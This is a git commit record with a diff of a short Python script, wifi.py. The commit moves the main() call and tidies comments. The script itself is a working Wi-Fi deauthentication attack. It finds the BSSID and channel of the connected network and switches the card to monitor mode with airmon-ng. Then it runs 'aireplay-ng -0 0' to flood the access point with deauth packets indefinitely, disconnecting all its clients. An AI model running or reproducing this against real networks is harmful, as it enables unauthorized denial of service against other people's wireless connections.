dccc7fd717ebd8f4e8f6fe7e055ec57e235ea2c6
Justin Jongstra <00300061@rijnijssel.nl>
2024-01-07 13:43:18 +0100

    added .idea to ignore / fixed NameError by reordering function definition & call

--- wifi.py
+++ wifi.py
@@ -1,19 +1,13 @@
- 
 import os
 import time
 
-if __name__ == "__main__":
-    main()
-
 
 def main():
-
-    #if airmon isn't installed, install it for manjaro
     if not os.path.exists("/usr/bin/airmon-ng"):
         os.system("sudo pacman -S aircrack-ng")
         print("airmon-ng installed")
         time.sleep(1)
-    
+
     connected = os.popen("iwgetid").read()
     if connected == "":
         print("Not connected")
@@ -21,38 +15,36 @@ def main():
         main()
     else:
         print(connected)
-        #see which interface is connected
         interface = connected.split()[0]
         print(interface)
         networkCard = interface.split(":")[0]
 
-    #get the bssid and channel of the network
     bssid = os.popen("iwgetid -a | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'").read()
     bssid = bssid.splitlines()[0]
     print(bssid)
-    
+
     channel = os.popen("iwgetid -c")
-    #remove everything but the channel number
-    channel = channel.read().replace(networkCard + "    Channel:","")
+    # remove everything but the channel number
+    channel = channel.read().replace(networkCard + "    Channel:", "")
     try:
         channel = channel.splitlines()[0]
-    except:        
+    except:
         print("Error getting channel\nIs it 5GHz?")
         time.sleep(5)
         main()
     print(channel)
 
     os.system("airmon-ng start " + networkCard)
-    #use iwconfig to set the channel
     os.system("iwconfig " + networkCard + "mon" + " channel " + channel)
-    #send deauth packets to the network
     os.system("aireplay-ng -0 0 -a " + bssid + " " + networkCard + "mon")
 
-    #stop airmong-ng process when the script is stopped
     os.system("airmon-ng stop " + networkCard + "mon")
+
 
 def quitProgram():
     print("Exiting")
     quit()
 
-main()
+
+if __name__ == "__main__":
+    main()
